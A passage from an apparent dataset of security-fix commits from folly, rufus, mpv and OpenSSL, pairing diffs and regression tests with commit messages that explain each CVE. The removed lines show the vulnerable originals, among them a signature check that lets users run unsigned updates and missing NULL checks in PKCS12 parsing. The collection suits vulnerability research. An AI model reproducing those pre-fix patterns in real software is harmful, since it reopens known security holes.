    \ fd), AsyncSocket::Destructor());\n+    evb_->runAfterDelay(\n+        [this]()\
    \ {\n+          perLoopReads_.setSocket(tcp_.get());\n+          tcp_->setReadCB(&perLoopReads_);\n\
    +          evb_->runAfterDelay([this]() { tcp_->closeNow(); }, 10);\n+       \
    \ },\n+        100);\n+  }\n+\n+  void connectErr(const AsyncSocketException&\
    \ ex) noexcept override {\n+    FAIL() << ex.what();\n+  }\n+\n+ private:\n+ \
    \ EventBase* evb_;\n+  std::shared_ptr<AsyncSSLSocket> ssl_;\n+  std::shared_ptr<AsyncSocket>\
    \ tcp_;\n+  PerLoopReadCallback perLoopReads_;\n+};\n+\n+class ErrorCheckingWriteCallback\
    \ : public AsyncSocket::WriteCallback {\n+ public:\n+  void writeSuccess() noexcept\
    \ override {}\n+\n+  void writeErr(size_t, const AsyncSocketException& ex) noexcept\
    \ override {\n+    LOG(ERROR) << \"write error: \" << ex.what();\n+    EXPECT_NE(\n\
    +        ex.getType(),\n+        AsyncSocketException::AsyncSocketExceptionType::SSL_ERROR);\n\
    +  }\n+};\n+\n+class WriteOnEofReadCallback : public ReadCallback {\n+ public:\n\
    +  using ReadCallback::ReadCallback;\n+\n+  void readEOF() noexcept override {\n\
    +    LOG(INFO) << \"Got EOF\";\n+    auto chain = IOBuf::create(0);\n+    for\
    \ (size_t i = 0; i < 1000 * 1000; i++) {\n+      auto buf = IOBuf::create(10);\n\
    +      buf->append(10);\n+      memset(buf->writableData(), 'x', 10);\n+     \
    \ chain->prependChain(std::move(buf));\n+    }\n+    socket_->writeChain(&writeCallback_,\
    \ std::move(chain));\n+  }\n+\n+  void readErr(const AsyncSocketException& ex)\
    \ noexcept override {\n+    LOG(ERROR) << ex.what();\n+  }\n+\n+ private:\n+ \
    \ ErrorCheckingWriteCallback writeCallback_;\n+};\n+\n+TEST(AsyncSSLSocketTest,\
    \ EarlyCloseNotify) {\n+  WriteOnEofReadCallback readCallback(nullptr);\n+  HandshakeCallback\
    \ handshakeCallback(&readCallback);\n+  SSLServerAcceptCallback acceptCallback(&handshakeCallback);\n\
    +  TestSSLServer server(&acceptCallback);\n+\n+  EventBase eventBase;\n+  CloseNotifyConnector\
    \ cnc(&eventBase, server.getAddress());\n+\n+  eventBase.loop();\n+}\n+\n /**\n\
    \  * Verify Client Ciphers obtained using SSL MSG Callback.\n  */"
  commit_message: 'Handle close_notify as standard writeErr in AsyncSSLSocket.


    Summary: Fixes CVE-2019-11934


    Reviewed By: mingtaoy


    Differential Revision: D18020613


    fbshipit-source-id: db82bb250e53f0d225f1280bd67bc74abd417836'
  commit_sha: c321eb588909646c15aefde035fd3133ba32cdee
  repo_name: facebook/folly
- commit_diff:
  - "--- a/src/pki.c\n+++ b/src/pki.c\n@@ -53,7 +53,7 @@ const char* WinPKIErrorString(void)\n\
    \ \tstatic char error_string[64];\n \tDWORD error_code = GetLastError();\n \n\
    -\tif ((error_code >> 16) != 0x8009)\n+\tif (((error_code >> 16) != 0x8009) &&\
    \ ((error_code >> 16) != 0x800B))\n \t\treturn WindowsErrorString();\n \n \tswitch\
    \ (error_code) {\n@@ -113,6 +113,12 @@ const char* WinPKIErrorString(void)\n \t\
    \treturn \"Cannot complete usage check.\";\n \tcase CRYPT_E_NO_TRUSTED_SIGNER:\n\
    \ \t\treturn \"None of the signers of the cryptographic message or certificate\
    \ trust list is trusted.\";\n+\tcase CERT_E_UNTRUSTEDROOT:\n+\t\treturn \"The\
    \ root certificate is not trusted.\";\n+\tcase TRUST_E_NOSIGNATURE:\n+\t\treturn\
    \ \"Not digitally signed.\";\n+\tcase TRUST_E_EXPLICIT_DISTRUST:\n+\t\treturn\
    \ \"One of the certificates used was marked as untrusted by the user.\";\n \t\
    default:\n \t\tstatic_sprintf(error_string, \"Unknown PKI error 0x%08lX\", error_code);\n\
    \ \t\treturn error_string;\n@@ -268,7 +274,13 @@ LONG ValidateSignature(HWND hDlg,\
    \ const char* path)\n \t}\n \n \ttrust_data.cbStruct = sizeof(trust_data);\n-\t\
    trust_data.dwUIChoice = WTD_UI_ALL;\n+\t// NB: WTD_UI_ALL can result in ERROR_SUCCESS\
    \ even if the signature validation fails,\n+\t// because it still prompts the\
    \ user to run untrusted software, even after explicitly\n+\t// notifying them\
    \ that the signature invalid (and of course Microsoft had to make\n+\t// that\
    \ UI prompt a bit too similar to the other benign prompt you get when running\n\
    +\t// trusted software, which, as per cert.org's assessment, may confuse non-security\n\
    +\t// conscious-users who decide to gloss over these kind of notifications).\n\
    +\ttrust_data.dwUIChoice = WTD_UI_NONE;\n \t// We just downloaded from the Internet,\
    \ so we should be able to check revocation\n \ttrust_data.fdwRevocationChecks\
    \ = WTD_REVOKE_WHOLECHAIN;\n \t// 0x400 = WTD_MOTW  for Windows 8.1 or later\n\
    @@ -278,6 +290,19 @@ LONG ValidateSignature(HWND hDlg, const char* path)\n \n\
    \ \tr = WinVerifyTrust(NULL, &guid_generic_verify, &trust_data);\n \tsafe_free(trust_file.pcwszFilePath);\n\
    +\tswitch (r) {\n+\tcase ERROR_SUCCESS:\n+\t\tbreak;\n+\tcase TRUST_E_NOSIGNATURE:\n\
    +\t\t// Should already have been reported, but since we have a custom message\
    \ for it...\n+\t\tuprintf(\"PKI: File does not appear to be signed: %s\", WinPKIErrorString());\n\
    +\t\tMessageBoxExU(hDlg, lmprintf(MSG_284), lmprintf(MSG_283), MB_OK | MB_ICONERROR\
    \ | MB_IS_RTL, selected_langid);\n+\t\tbreak;\n+\tdefault:\n+\t\tuprintf(\"PKI:\
    \ Failed to validate signature: %s\", WinPKIErrorString());\n+\t\tMessageBoxExU(hDlg,\
    \ lmprintf(MSG_240), lmprintf(MSG_283), MB_OK | MB_ICONERROR | MB_IS_RTL, selected_langid);\n\
    +\t\tbreak;\n+\t}\n \n \treturn r;\n }"
  - "--- a/src/stdlg.c\n+++ b/src/stdlg.c\n@@ -1674,8 +1674,12 @@ INT_PTR CALLBACK\
    \ NewVersionCallback(HWND hDlg, UINT message, WPARAM wParam, LPAR\n \t\t\tcase\
    \ 2:\t\t// Launch newer version and close this one\n \t\t\t\tSleep(1000);\t//\
    \ Add a delay on account of antivirus scanners\n \n-\t\t\t\tif (ValidateSignature(hDlg,\
    \ filepath) != NO_ERROR)\n+\t\t\t\tif (ValidateSignature(hDlg, filepath) != NO_ERROR)\
    \ {\n+\t\t\t\t\t// Unconditionally delete the download and disable the \"Launch\"\
    \ control\n+\t\t\t\t\t_unlinkU(filepath);\n+\t\t\t\t\tEnableWindow(GetDlgItem(hDlg,\
    \ IDC_DOWNLOAD), FALSE);\n \t\t\t\t\tbreak;\n+\t\t\t\t}\n \n \t\t\t\tmemset(&si,\
    \ 0, sizeof(si));\n \t\t\t\tmemset(&pi, 0, sizeof(pi));"
  commit_message: "[pki] fix https://www.kb.cert.org/vuls/id/403768\n\n* This commit\
    \ effectively fixes https://www.kb.cert.org/vuls/id/403768 (CVE-2017-13083) as\n\
    \  it is described per its revision 11, which is the latest revision at the time\
    \ of this commit,\n  by disabling Windows prompts, enacted during signature validation,\
    \ that allow the user to\n  bypass the intended signature verification checks.\n\
    * It needs to be pointed out that the vulnerability (\"allow(ing) the use of a\
    \ self-signed\n  certificate\"), which relies on the end-user actively ignoring\
    \ a Windows prompt that tells\n  them that the update failed the signature validation\
    \ whilst also advising against running it,\n  is being fully addressed, even as\
    \ the update protocol remains HTTP.\n* It also need to be pointed out that the\
    \ extended delay (48 hours) between the time the\n  vulnerability was reported\
    \ and the moment it is fixed in our codebase has to do with\n  the fact that the\
    \ reporter chose to deviate from standard security practices by not\n  disclosing\
    \ the details of the vulnerability with us, be it publicly or privately,\n  before\
    \ creating the cert.org report. The only advance notification we received was\
    \ a\n  generic note about the use of HTTP vs HTTPS, which, as have established,\
    \ is not\n  immediately relevant to addressing the reported vulnerability.\n*\
    \ Closes #1009\n* Note: The other vulnerability scenario described towards the\
    \ end of #1009, which\n  doesn't have to do with the \"lack of CA checking\",\
    \ will be addressed separately."
  commit_sha: c3c39f7f8a11f612c4ebf7affce25ec6928eb1cb
  repo_name: pbatard/rufus
- commit_diff:
  - "--- a/stream/stream_libarchive.c\n+++ b/stream/stream_libarchive.c\n@@ -361,6\
    \ +361,7 @@ static int reopen_archive(stream_t *s)\n {\n     struct priv *p =\
    \ s->priv;\n     mp_archive_free(p->mpa);\n+    s->pos = 0;\n     p->mpa = mp_archive_new(s->log,\
    \ p->src, MP_ARCHIVE_FLAG_UNSAFE);\n     if (!p->mpa)\n         return STREAM_ERROR;\n\
    @@ -423,9 +424,10 @@ static int archive_entry_seek(stream_t *s, int64_t newpos)\n\
    \         MP_VERBOSE(s, \"trying to reopen archive for performing seek\\n\");\n\
    \         if (reopen_archive(s) < STREAM_OK)\n             return -1;\n-     \
    \   s->pos = 0;\n     }\n     if (newpos > s->pos) {\n+        if (!p->mpa &&\
    \ reopen_archive(s) < STREAM_OK)\n+            return -1;\n         // For seeking\
    \ forwards, just keep reading data (there's no libarchive\n         // skip function\
    \ either).\n         char buffer[4096];"
  commit_message: 'stream_libarchive: fix another crash with broken rar files


    libarchive (sometimes affectionately called libcve) has this annoying

    behavior that if after a "fatal" error, you do any operation on the

    archive context other than querying the error and closing the context,

    you get a free CVE. So we close the archive context in these situations.

    This can set p->mpa to NULL, so code accessing this field needs to be

    careful.


    This was not considered in a certain code path, and a simple truncated

    .rar file made it crash. Part of the problem was that the file inside

    the rar was a mkv file, which triggered seeking when the demux_mkv

    resync code encountered bogus data.


    This is probably a regression from a relatively recent change to this

    code (in any case mpv 0.29.1 doesn''t crash).


    Fix this by adding the check.


    There''s also a mechanism to reopen an archive context used to emulate

    seeking, since most libarchive format handlers don''t support this

    natively. Add a reopen call to the codepath, because obviously it should

    always be possible to seek back into a "working" area of the file.


    There is a second bug with this: if reopening fails, we don''t adjust the

    current position back to 0, which in some cases means we accidentally

    return bogus data to the reader when we shouldn''t. Fix this by always

    resetting the position on reopening.'
  commit_sha: 8ca438636682b90de807dd1c46ad18cfab950c4b
  repo_name: mpv-player/mpv
- commit_diff:
  - "--- a/crypto/pkcs12/p12_add.c\n+++ b/crypto/pkcs12/p12_add.c\n@@ -78,6 +78,12\
    \ @@ STACK_OF(PKCS12_SAFEBAG) *PKCS12_unpack_p7data(PKCS7 *p7)\n         ERR_raise(ERR_LIB_PKCS12,\
    \ PKCS12_R_CONTENT_TYPE_NOT_DATA);\n         return NULL;\n     }\n+\n+    if\
    \ (p7->d.data == NULL) {\n+        ERR_raise(ERR_LIB_PKCS12, PKCS12_R_DECODE_ERROR);\n\
    +        return NULL;\n+    }\n+\n     return ASN1_item_unpack_ex(p7->d.data,\
    \ ASN1_ITEM_rptr(PKCS12_SAFEBAGS),\n                                ossl_pkcs7_ctx_get0_libctx(&p7->ctx),\n\
    \                                ossl_pkcs7_ctx_get0_propq(&p7->ctx));\n@@ -152,6\
    \ +158,12 @@ STACK_OF(PKCS12_SAFEBAG) *PKCS12_unpack_p7encdata(PKCS7 *p7, const\
    \ char *pass,\n {\n     if (!PKCS7_type_is_encrypted(p7))\n         return NULL;\n\
    +\n+    if (p7->d.encrypted == NULL) {\n+        ERR_raise(ERR_LIB_PKCS12, PKCS12_R_DECODE_ERROR);\n\
    +        return NULL;\n+    }\n+\n     return PKCS12_item_decrypt_d2i_ex(p7->d.encrypted->enc_data->algorithm,\n\
    \                                    ASN1_ITEM_rptr(PKCS12_SAFEBAGS),\n      \
    \                              pass, passlen,\n@@ -191,6 +203,12 @@ STACK_OF(PKCS7)\
    \ *PKCS12_unpack_authsafes(const PKCS12 *p12)\n         ERR_raise(ERR_LIB_PKCS12,\
    \ PKCS12_R_CONTENT_TYPE_NOT_DATA);\n         return NULL;\n     }\n+\n+    if\
    \ (p12->authsafes->d.data == NULL) {\n+        ERR_raise(ERR_LIB_PKCS12, PKCS12_R_DECODE_ERROR);\n\
    +        return NULL;\n+    }\n+\n     p7ctx = &p12->authsafes->ctx;\n     p7s\
    \ = ASN1_item_unpack_ex(p12->authsafes->d.data,\n                            \
    \   ASN1_ITEM_rptr(PKCS12_AUTHSAFES),"
  - "--- a/crypto/pkcs12/p12_mutl.c\n+++ b/crypto/pkcs12/p12_mutl.c\n@@ -98,6 +98,11\
    \ @@ static int pkcs12_gen_mac(PKCS12 *p12, const char *pass, int passlen,\n \
    \        return 0;\n     }\n \n+    if (p12->authsafes->d.data == NULL) {\n+ \
    \       ERR_raise(ERR_LIB_PKCS12, PKCS12_R_DECODE_ERROR);\n+        return 0;\n\
    +    }\n+\n     salt = p12->mac->salt->data;\n     saltlen = p12->mac->salt->length;\n\
    \     if (p12->mac->iter == NULL)"
  - "--- a/crypto/pkcs12/p12_npas.c\n+++ b/crypto/pkcs12/p12_npas.c\n@@ -80,8 +80,9\
    \ @@ static int newpass_p12(PKCS12 *p12, const char *oldpass, const char *newpass)\n\
    \             bags = PKCS12_unpack_p7data(p7);\n         } else if (bagnid ==\
    \ NID_pkcs7_encrypted) {\n             bags = PKCS12_unpack_p7encdata(p7, oldpass,\
    \ -1);\n-            if (!alg_get(p7->d.encrypted->enc_data->algorithm,\n-   \
    \                      &pbe_nid, &pbe_iter, &pbe_saltlen, &cipherid))\n+     \
    \       if (p7->d.encrypted == NULL\n+                    || !alg_get(p7->d.encrypted->enc_data->algorithm,\n\
    +                                &pbe_nid, &pbe_iter, &pbe_saltlen, &cipherid))\n\
    \                 goto err;\n         } else {\n             continue;"
  - "--- a/crypto/pkcs7/pk7_mime.c\n+++ b/crypto/pkcs7/pk7_mime.c\n@@ -33,10 +33,13\
    \ @@ int SMIME_write_PKCS7(BIO *bio, PKCS7 *p7, BIO *data, int flags)\n     int\
    \ ctype_nid = OBJ_obj2nid(p7->type);\n     const PKCS7_CTX *ctx = ossl_pkcs7_get0_ctx(p7);\n\
    \ \n-    if (ctype_nid == NID_pkcs7_signed)\n+    if (ctype_nid == NID_pkcs7_signed)\
    \ {\n+        if (p7->d.sign == NULL)\n+            return 0;\n         mdalgs\
    \ = p7->d.sign->md_algs;\n-    else\n+    } else {\n         mdalgs = NULL;\n\
    +    }\n \n     flags ^= SMIME_OLDMIME;\n "
  commit_message: 'Add NULL checks where ContentInfo data can be NULL


    PKCS12 structures contain PKCS7 ContentInfo fields. These fields are

    optional and can be NULL even if the "type" is a valid value. OpenSSL

    was not properly accounting for this and a NULL dereference can occur

    causing a crash.


    CVE-2024-0727


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Hugo Landau <hlandau@openssl.org>

    Reviewed-by: Neil Horman <nhorman@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/23361)'
  commit_sha: 041962b429ebe748c8b6b7922980dfb6decfef26
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/rsa/rsa_sp800_56b_check.c\n+++ b/crypto/rsa/rsa_sp800_56b_check.c\n\
    @@ -289,6 +289,11 @@ int ossl_rsa_sp800_56b_check_public(const RSA *rsa)\n   \
    \      return 0;\n \n     nbits = BN_num_bits(rsa->n);\n+    if (nbits > OPENSSL_RSA_MAX_MODULUS_BITS)\
    \ {\n+        ERR_raise(ERR_LIB_RSA, RSA_R_MODULUS_TOO_LARGE);\n+        return\
    \ 0;\n+    }\n+\n #ifdef FIPS_MODULE\n     /*\n      * (Step a): modulus must\
    \ be 2048 or 3072 (caveat from SP800-56Br1)\n@@ -324,7 +329,8 @@ int ossl_rsa_sp800_56b_check_public(const\
    \ RSA *rsa)\n         goto err;\n     }\n \n-    ret = ossl_bn_miller_rabin_is_prime(rsa->n,\
    \ 0, ctx, NULL, 1, &status);\n+    /* Highest number of MR rounds from FIPS 186-5\
    \ Section B.3 Table B.1 */\n+    ret = ossl_bn_miller_rabin_is_prime(rsa->n, 5,\
    \ ctx, NULL, 1, &status);\n #ifdef FIPS_MODULE\n     if (ret != 1 || status !=\
    \ BN_PRIMETEST_COMPOSITE_NOT_POWER_OF_PRIME) {\n #else"
  commit_message: 'Limit the execution time of RSA public key check


    Fixes CVE-2023-6237


    If a large and incorrect RSA public key is checked with

    EVP_PKEY_public_check() the computation could take very long time

    due to no limit being applied to the RSA public key size and

    unnecessarily high number of Miller-Rabin algorithm rounds

    used for non-primality check of the modulus.


    Now the keys larger than 16384 bits (OPENSSL_RSA_MAX_MODULUS_BITS)

    will fail the check with RSA_R_MODULUS_TOO_LARGE error reason.

    Also the number of Miller-Rabin rounds was set to 5.


    Reviewed-by: Neil Horman <nhorman@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/23243)'
  commit_sha: e09fc1d746a4fd15bb5c3d7bbbab950aadd005db
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/apps/errstr.c\n+++ b/apps/errstr.c\n@@ -62,7 +62,7 @@ int errstr_main(int\
    \ argc, char **argv)\n     /* All remaining arg are error code. */\n     ret =\
    \ 0;\n     for (argv = opt_rest(); *argv != NULL; argv++) {\n-        if (sscanf(*argv,\
    \ \"%lx\", &l) == 0) {\n+        if (sscanf(*argv, \"%lx\", &l) <= 0) {\n    \
    \         ret++;\n         } else {\n             ERR_error_string_n(l, buf, sizeof(buf));"
  - "--- a/crypto/http/http_lib.c\n+++ b/crypto/http/http_lib.c\n@@ -118,7 +118,7\
    \ @@ int OSSL_parse_url(const char *url, char **pscheme, char **puser, char **phost,\n\
    \         port = ++p;\n     /* remaining port spec handling is also done for the\
    \ default values */\n     /* make sure a decimal port number is given */\n-  \
    \  if (!sscanf(port, \"%u\", &portnum) || portnum > 65535) {\n+    if (sscanf(port,\
    \ \"%u\", &portnum) <= 0 || portnum > 65535) {\n         ERR_raise_data(ERR_LIB_HTTP,\
    \ HTTP_R_INVALID_PORT_NUMBER, \"%s\", port);\n         goto err;\n     }"
  commit_message: 'Fix some invalid use of sscanf


    sscanf can return -1 on an empty input string. We need to appropriately

    handle such an invalid case.


    The instance in OSSL_HTTP_parse_url could cause an uninitialised read of

    sizeof(unsigned int) bytes (typically 4). In many cases this uninit read

    will immediately fail on the following check (i.e. if the read value

    >65535).


    If the top 2 bytes of a 4 byte unsigned int are zero then the value will

    be <=65535 and the uninitialised value will be returned to the caller and

    could represent arbitrary data on the application stack.


    The OpenSSL security team has assessed this issue and consider it to be

    a bug only (i.e. not a CVE).


    Reviewed-by: Todd Short <todd.short@me.com>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Shane Lontis <shane.lontis@oracle.com>

    (Merged from https://github.com/openssl/openssl/pull/22961)'
  commit_sha: 322517d817ecb5c1a3a8b0e7e038fa146857b4d4
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/test/evp_extra_test.c\n+++ b/test/evp_extra_test.c\n@@ -5051,6 +5051,253\
    \ @@ static int test_sign_continuation(void)\n     return testresult;\n }\n \n\
    +static int aes_gcm_encrypt(const unsigned char *gcm_key, size_t gcm_key_s,\n\
    +                           const unsigned char *gcm_iv, size_t gcm_ivlen,\n+\
    \                           const unsigned char *gcm_pt, size_t gcm_pt_s,\n+ \
    \                          const unsigned char *gcm_aad, size_t gcm_aad_s,\n+\
    \                           const unsigned char *gcm_ct, size_t gcm_ct_s,\n+ \
    \                          const unsigned char *gcm_tag, size_t gcm_tag_s)\n+{\n\
    +    int ret = 0;\n+    EVP_CIPHER_CTX *ctx;\n+    EVP_CIPHER *cipher = NULL;\n\
    +    int outlen, tmplen;\n+    unsigned char outbuf[1024];\n+    unsigned char\
    \ outtag[16];\n+    OSSL_PARAM params[2] = {\n+        OSSL_PARAM_END, OSSL_PARAM_END\n\
    +    };\n+\n+    if (!TEST_ptr(ctx = EVP_CIPHER_CTX_new())\n+            || !TEST_ptr(cipher\
    \ = EVP_CIPHER_fetch(testctx, \"AES-256-GCM\", \"\")))\n+        goto err;\n+\n\
    +    params[0] = OSSL_PARAM_construct_size_t(OSSL_CIPHER_PARAM_AEAD_IVLEN,\n+\
    \                                            &gcm_ivlen);\n+\n+    if (!TEST_true(EVP_EncryptInit_ex2(ctx,\
    \ cipher, gcm_key, gcm_iv, params))\n+            || (gcm_aad != NULL\n+     \
    \           && !TEST_true(EVP_EncryptUpdate(ctx, NULL, &outlen,\n+           \
    \                                     gcm_aad, gcm_aad_s)))\n+            || !TEST_true(EVP_EncryptUpdate(ctx,\
    \ outbuf, &outlen,\n+                                            gcm_pt, gcm_pt_s))\n\
    +            || !TEST_true(EVP_EncryptFinal_ex(ctx, outbuf, &tmplen)))\n+    \
    \    goto err;\n+\n+    params[0] = OSSL_PARAM_construct_octet_string(OSSL_CIPHER_PARAM_AEAD_TAG,\n\
    +                                                  outtag, sizeof(outtag));\n\
    +\n+    if (!TEST_true(EVP_CIPHER_CTX_get_params(ctx, params))\n+            ||\
    \ !TEST_mem_eq(outbuf, outlen, gcm_ct, gcm_ct_s)\n+            || !TEST_mem_eq(outtag,\
    \ gcm_tag_s, gcm_tag, gcm_tag_s))\n+        goto err;\n+\n+    ret = 1;\n+err:\n\
    +    EVP_CIPHER_free(cipher);\n+    EVP_CIPHER_CTX_free(ctx);\n+\n+    return\
    \ ret;\n+}\n+\n+static int aes_gcm_decrypt(const unsigned char *gcm_key, size_t\
    \ gcm_key_s,\n+                           const unsigned char *gcm_iv, size_t\
    \ gcm_ivlen,\n+                           const unsigned char *gcm_pt, size_t\
    \ gcm_pt_s,\n+                           const unsigned char *gcm_aad, size_t\
    \ gcm_aad_s,\n+                           const unsigned char *gcm_ct, size_t\
    \ gcm_ct_s,\n+                           const unsigned char *gcm_tag, size_t\
    \ gcm_tag_s)\n+{\n+    int ret = 0;\n+    EVP_CIPHER_CTX *ctx;\n+    EVP_CIPHER\
    \ *cipher = NULL;\n+    int outlen;\n+    unsigned char outbuf[1024];\n+    OSSL_PARAM\
    \ params[2] = {\n+        OSSL_PARAM_END, OSSL_PARAM_END\n+    };\n+\n+    if\
    \ ((ctx = EVP_CIPHER_CTX_new()) == NULL)\n+        goto err;\n+\n+    if ((cipher\
    \ = EVP_CIPHER_fetch(testctx, \"AES-256-GCM\", \"\")) == NULL)\n+        goto\
    \ err;\n+\n+    params[0] = OSSL_PARAM_construct_size_t(OSSL_CIPHER_PARAM_AEAD_IVLEN,\n\
    +                                            &gcm_ivlen);\n+\n+    if (!TEST_true(EVP_DecryptInit_ex2(ctx,\
    \ cipher, gcm_key, gcm_iv, params))\n+            || (gcm_aad != NULL\n+     \
    \           && !TEST_true(EVP_DecryptUpdate(ctx, NULL, &outlen,\n+           \
    \                                     gcm_aad, gcm_aad_s)))\n+            || !TEST_true(EVP_DecryptUpdate(ctx,\
    \ outbuf, &outlen,\n+                                            gcm_ct, gcm_ct_s))\n\
    +            || !TEST_mem_eq(outbuf, outlen, gcm_pt, gcm_pt_s))\n+        goto\
    \ err;\n+\n+    params[0] = OSSL_PARAM_construct_octet_string(OSSL_CIPHER_PARAM_AEAD_TAG,\n\
    +                                                  (void*)gcm_tag, gcm_tag_s);\n\
    +\n+    if (!TEST_true(EVP_CIPHER_CTX_set_params(ctx, params))\n+            ||!TEST_true(EVP_DecryptFinal_ex(ctx,\
    \ outbuf, &outlen)))\n+        goto err;\n+\n+    ret = 1;\n+err:\n+    EVP_CIPHER_free(cipher);\n\
    +    EVP_CIPHER_CTX_free(ctx);\n+\n+    return ret;\n+}\n+\n+static int test_aes_gcm_ivlen_change_cve_2023_5363(void)\n\
    +{\n+    /* AES-GCM test data obtained from NIST public test vectors */\n+   \
    \ static const unsigned char gcm_key[] = {\n+        0xd0, 0xc2, 0x67, 0xc1, 0x9f,\
    \ 0x30, 0xd8, 0x0b, 0x89, 0x14, 0xbb, 0xbf,\n+        0xb7, 0x2f, 0x73, 0xb8,\
    \ 0xd3, 0xcd, 0x5f, 0x6a, 0x78, 0x70, 0x15, 0x84,\n+        0x8a, 0x7b, 0x30,\
    \ 0xe3, 0x8f, 0x16, 0xf1, 0x8b,\n+    };\n+    static const unsigned char gcm_iv[]\
    \ = {\n+        0xb6, 0xdc, 0xda, 0x95, 0xac, 0x99, 0x77, 0x76, 0x25, 0xae, 0x87,\
    \ 0xf8,\n+        0xa3, 0xa9, 0xdd, 0x64, 0xd7, 0x9b, 0xbd, 0x5f, 0x4a, 0x0e,\
    \ 0x54, 0xca,\n+        0x1a, 0x9f, 0xa2, 0xe3, 0xf4, 0x5f, 0x5f, 0xc2, 0xce,\
    \ 0xa7, 0xb6, 0x14,\n+        0x12, 0x6f, 0xf0, 0xaf, 0xfd, 0x3e, 0x17, 0x35,\
    \ 0x6e, 0xa0, 0x16, 0x09,\n+        0xdd, 0xa1, 0x3f, 0xd8, 0xdd, 0xf3, 0xdf,\
    \ 0x4f, 0xcb, 0x18, 0x49, 0xb8,\n+        0xb3, 0x69, 0x2c, 0x5d, 0x4f, 0xad,\
    \ 0x30, 0x91, 0x08, 0xbc, 0xbe, 0x24,\n+        0x01, 0x0f, 0xbe, 0x9c, 0xfb,\
    \ 0x4f, 0x5d, 0x19, 0x7f, 0x4c, 0x53, 0xb0,\n+        0x95, 0x90, 0xac, 0x7b,\
    \ 0x1f, 0x7b, 0xa0, 0x99, 0xe1, 0xf3, 0x48, 0x54,\n+        0xd0, 0xfc, 0xa9,\
    \ 0xcc, 0x91, 0xf8, 0x1f, 0x9b, 0x6c, 0x9a, 0xe0, 0xdc,\n+        0x63, 0xea,\
    \ 0x7d, 0x2a, 0x4a, 0x7d, 0xa5, 0xed, 0x68, 0x57, 0x27, 0x6b,\n+        0x68,\
    \ 0xe0, 0xf2, 0xb8, 0x51, 0x50, 0x8d, 0x3d,\n+    };\n+    static const unsigned\
    \ char gcm_pt[] = {\n+        0xb8, 0xb6, 0x88, 0x36, 0x44, 0xe2, 0x34, 0xdf,\
    \ 0x24, 0x32, 0x91, 0x07,\n+        0x4f, 0xe3, 0x6f, 0x81,\n+    };\n+    static\
    \ const unsigned char gcm_ct[] = {\n+        0xff, 0x4f, 0xb3, 0xf3, 0xf9, 0xa2,\
    \ 0x51, 0xd4, 0x82, 0xc2, 0xbe, 0xf3,\n+        0xe2, 0xd0, 0xec, 0xed,\n+   \
    \ };\n+    static const unsigned char gcm_tag[] = {\n+        0xbd, 0x06, 0x38,\
    \ 0x09, 0xf7, 0xe1, 0xc4, 0x72, 0x0e, 0xf2, 0xea, 0x63,\n+        0xdb, 0x99,\
    \ 0x6c, 0x21,\n+    };\n+\n+    return aes_gcm_encrypt(gcm_key, sizeof(gcm_key),\
    \ gcm_iv, sizeof(gcm_iv),\n+                           gcm_pt, sizeof(gcm_pt),\
    \ NULL, 0,\n+                           gcm_ct, sizeof(gcm_ct), gcm_tag, sizeof(gcm_tag))\n\
    +        && aes_gcm_decrypt(gcm_key, sizeof(gcm_key), gcm_iv, sizeof(gcm_iv),\n\
    +                           gcm_pt, sizeof(gcm_pt), NULL, 0,\n+              \
    \             gcm_ct, sizeof(gcm_ct), gcm_tag, sizeof(gcm_tag));\n+}\n+\n+#ifndef\
    \ OPENSSL_NO_RC4\n+static int rc4_encrypt(const unsigned char *rc4_key, size_t\
    \ rc4_key_s,\n+                       const unsigned char *rc4_pt, size_t rc4_pt_s,\n\
    +                       const unsigned char *rc4_ct, size_t rc4_ct_s)\n+{\n+ \
    \   int ret = 0;\n+    EVP_CIPHER_CTX *ctx;\n+    EVP_CIPHER *cipher = NULL;\n\
    +    int outlen, tmplen;\n+    unsigned char outbuf[1024];\n+    OSSL_PARAM params[2]\
    \ = {\n+        OSSL_PARAM_END, OSSL_PARAM_END\n+    };\n+\n+    if (!TEST_ptr(ctx\
    \ = EVP_CIPHER_CTX_new())\n+            || !TEST_ptr(cipher = EVP_CIPHER_fetch(testctx,\
    \ \"RC4\", \"\")))\n+        goto err;\n+\n+    params[0] = OSSL_PARAM_construct_size_t(OSSL_CIPHER_PARAM_KEYLEN,\n\
    +                                            &rc4_key_s);\n+\n+    if (!TEST_true(EVP_EncryptInit_ex2(ctx,\
    \ cipher, rc4_key, NULL, params))\n+            || !TEST_true(EVP_EncryptUpdate(ctx,\
    \ outbuf, &outlen,\n+                                            rc4_pt, rc4_pt_s))\n\
    +            || !TEST_true(EVP_EncryptFinal_ex(ctx, outbuf, &tmplen)))\n+    \
    \    goto err;\n+\n+    if (!TEST_mem_eq(outbuf, outlen, rc4_ct, rc4_ct_s))\n\
    +        goto err;\n+\n+    ret = 1;\n+err:\n+    EVP_CIPHER_free(cipher);\n+\
    \    EVP_CIPHER_CTX_free(ctx);\n+\n+    return ret;\n+}\n+\n+static int rc4_decrypt(const\
    \ unsigned char *rc4_key, size_t rc4_key_s,\n+                       const unsigned\
    \ char *rc4_pt, size_t rc4_pt_s,\n+                       const unsigned char\
    \ *rc4_ct, size_t rc4_ct_s)\n+{\n+    int ret = 0;\n+    EVP_CIPHER_CTX *ctx;\n\
    +    EVP_CIPHER *cipher = NULL;\n+    int outlen;\n+    unsigned char outbuf[1024];\n\
    +    OSSL_PARAM params[2] = {\n+        OSSL_PARAM_END, OSSL_PARAM_END\n+    };\n\
    +\n+    if ((ctx = EVP_CIPHER_CTX_new()) == NULL)\n+        goto err;\n+\n+  \
    \  if ((cipher = EVP_CIPHER_fetch(testctx, \"RC4\", \"\")) == NULL)\n+       \
    \ goto err;\n+\n+    params[0] = OSSL_PARAM_construct_size_t(OSSL_CIPHER_PARAM_KEYLEN,\n\
    +                                            &rc4_key_s);\n+\n+    if (!TEST_true(EVP_DecryptInit_ex2(ctx,\
    \ cipher, rc4_key, NULL, params))\n+            || !TEST_true(EVP_DecryptUpdate(ctx,\
    \ outbuf, &outlen,\n+                                            rc4_ct, rc4_ct_s))\n\
    +            || !TEST_mem_eq(outbuf, outlen, rc4_pt, rc4_pt_s))\n+        goto\
